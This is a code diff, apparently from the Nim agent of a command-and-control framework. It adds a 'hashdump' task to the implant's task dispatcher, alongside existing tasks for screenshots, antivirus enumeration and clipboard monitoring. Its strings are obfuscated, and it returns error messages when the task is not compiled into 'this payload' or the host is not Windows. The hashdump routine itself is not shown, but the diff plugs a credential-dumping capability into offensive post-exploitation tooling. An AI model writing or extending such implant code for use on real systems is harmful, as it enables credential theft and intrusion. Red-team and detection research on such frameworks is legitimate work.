@@ -116,6 +116,8 @@ when defined(windows):
     import ../tasks/screenshot
   when defined(cmd_get_av):
     import ../tasks/get_av
+  when defined(cmd_hashdump):
+    import ../tasks/hashdump
   when defined(cmd_clipboard):
     import ../tasks/clipboard
   when defined(cmd_clipboard_monitor):
@@ -765,6 +767,26 @@ proc executeTask*(taskId: string, command: string, params: JsonNode): TaskExecut
             obf("status"): "error",
             obf("user_output"): obf("get_av command is only available on Windows")
           }
+
+    of obf("hashdump"):
+      when defined(cmd_hashdump):
+        when defined(windows):
+          debug "[DEBUG] Executing hashdump command"
+          result.response = hashdump(taskId, params)
+        else:
+          result.response = %*{
+            obf("task_id"): taskId,
+            obf("completed"): true,
+            obf("status"): "error",
+            obf("user_output"): obf("hashdump command is only available on Windows")
+          }
+      else:
+        result.response = %*{
+          obf("task_id"): taskId,
+          obf("completed"): true,
+          obf("status"): "error",
+          obf("user_output"): obf("hashdump was not compiled into this payload")
+        }
     
     of obf("clipboard"):
       when defined(cmd_clipboard):
